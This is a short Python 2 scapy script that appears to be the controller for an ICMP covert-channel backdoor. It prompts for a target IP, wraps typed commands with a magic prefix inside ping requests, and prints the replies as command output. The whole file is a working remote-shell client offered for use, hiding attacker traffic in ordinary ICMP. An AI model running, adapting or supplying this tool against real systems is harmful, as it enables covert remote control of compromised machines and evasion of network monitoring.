#!/usr/bin/python

#importing modules
try:
	from scapy.all import *
except Exception,e:
	print "Exception: " + str(e)

def send(ip_target):
	while 1:
		icmp = ICMP()
		ip = IP()
		icmp.type = 8
		icmp.code = 0
		ip.dst = ip_target
		data = "nytcrwlr"
		data = data + raw_input("#")
		data = data.strip("\r").strip("\n").lower()
		if data == "nytcrwlrexit":
			packt = sr1(ip/icmp/data,verbose=False)
			sys.exit(0)
		else:
			packt = sr1(ip/icmp/data,timeout=1,verbose=False)
			output(ip_target)

def output(ip_target):
	flag = 1
	while flag:
		resp = sniff(iface="eth0", timeout=2)
		for packet in resp:
			if packet.haslayer(ICMP):
				if str(packet.getlayer(ICMP).type) == "0":
					flag = 0
					out = packet.getlayer(Raw).load[0:]
					print str(out)
					icmp = ICMP()
					ip = IP()
					icmp.type = 8
					icmp.code = 0
					ip.dst = ip_target
					sr1(ip/icmp,timeout=1,verbose=False)
					send(ip_target)

def main():
	ip_target = raw_input("[+]Enter the Target IP address: ")
	subprocess.call('clear',shell=True)
	send(ip_target)

if __name__ == "__main__":
	main()
